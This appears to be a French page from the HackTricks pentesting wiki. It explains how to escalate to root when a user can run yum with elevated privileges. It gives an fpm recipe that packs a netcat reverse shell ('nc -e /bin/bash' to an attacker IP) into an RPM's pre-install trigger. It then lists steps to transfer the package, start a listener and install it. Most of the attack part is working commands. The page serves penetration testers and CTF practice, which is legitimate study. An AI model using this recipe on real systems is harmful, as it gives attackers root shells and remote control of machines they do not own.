<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Travaillez-vous dans une entreprise de cybersécurité ? Voulez-vous voir votre entreprise annoncée dans HackTricks ? ou voulez-vous avoir accès à la dernière version de PEASS ou télécharger HackTricks en PDF ? Consultez les [PLANS D'ABONNEMENT](https://github.com/sponsors/carlospolop) !

- Découvrez [La famille PEASS](https://opensea.io/collection/the-peass-family), notre collection exclusive de [NFTs](https://opensea.io/collection/the-peass-family)

- Obtenez le [swag officiel PEASS & HackTricks](https://peass.creator-spring.com)

- **Rejoignez le** [💬](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [groupe telegram](https://t.me/peass) ou **suivez** moi sur **Twitter** [🐦](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[@carlospolopm](https://twitter.com/hacktricks_live).

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

D'autres exemples autour de yum peuvent également être trouvés sur [gtfobins](https://gtfobins.github.io/gtfobins/yum/).

# Exécution de commandes arbitraires via les paquets RPM
## Vérification de l'environnement
Pour exploiter cette vulnérabilité, l'utilisateur doit être en mesure d'exécuter des commandes yum en tant qu'utilisateur à privilèges élevés, c'est-à-dire root.

### Un exemple de travail de cette vulnérabilité
Un exemple de travail de cette vulnérabilité peut être trouvé dans la salle [daily bugle](https://tryhackme.com/room/dailybugle) sur [tryhackme](https://tryhackme.com).

## Emballage d'un RPM
Dans la section suivante, je vais couvrir l'emballage d'un shell inversé dans un RPM en utilisant [fpm](https://github.com/jordansissel/fpm).

L'exemple ci-dessous crée un paquet qui inclut un déclencheur avant l'installation avec un script arbitraire qui peut être défini par l'attaquant. Lorsqu'il est installé, ce paquet exécutera la commande arbitraire. J'ai utilisé un exemple de shell netcat inversé simple à des fins de démonstration, mais cela peut être modifié selon les besoins.
```text
EXPLOITDIR=$(mktemp -d)
CMD='nc -e /bin/bash <ATTACKER IP> <PORT>'
RPMNAME="exploited"
echo $CMD > $EXPLOITDIR/beforeinstall.sh
fpm -n $RPMNAME -s dir -t rpm -a all --before-install $EXPLOITDIR/beforeinstall.sh $EXPLOITDIR
```
# Obtenir un shell
En utilisant l'exemple ci-dessus et en supposant que `yum` peut être exécuté en tant qu'utilisateur à privilèges élevés :

1. **Transférez** le fichier rpm sur l'hôte
2. **Démarrez** un écouteur sur votre hôte local tel que l'[exemple d'écouteur netcat](/shells/shells/linux#netcat)
3. **Installez** le package vulnérable `yum localinstall -y exploited-1.0-1.noarch.rpm`
